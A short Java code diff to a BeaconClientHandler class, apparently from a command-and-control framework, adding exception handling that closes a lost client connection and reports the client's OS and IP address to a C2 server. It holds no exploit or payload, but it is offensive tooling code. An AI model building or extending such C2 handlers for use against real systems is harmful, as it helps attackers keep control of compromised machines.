@@ -77,6 +77,20 @@ public class BeaconClientHandler implements Runnable{
                 }
             } catch (IOException e){
                 sentinel = false;
+                try{
+                    duplexer.close();
+                } catch (IOException d){
+                    d.printStackTrace();
+                }
+                beaconServer.sendDataToC2Server("Lost " + os + " Client at " + IPAddress);
+                e.printStackTrace();
+            } catch (java.lang.NullPointerException e){
+                sentinel = false;
+                try{
+                    duplexer.close();
+                } catch (IOException d){
+                    d.printStackTrace();
+                }
                 beaconServer.sendDataToC2Server("Lost " + os + " Client at " + IPAddress);
                 e.printStackTrace();
             }
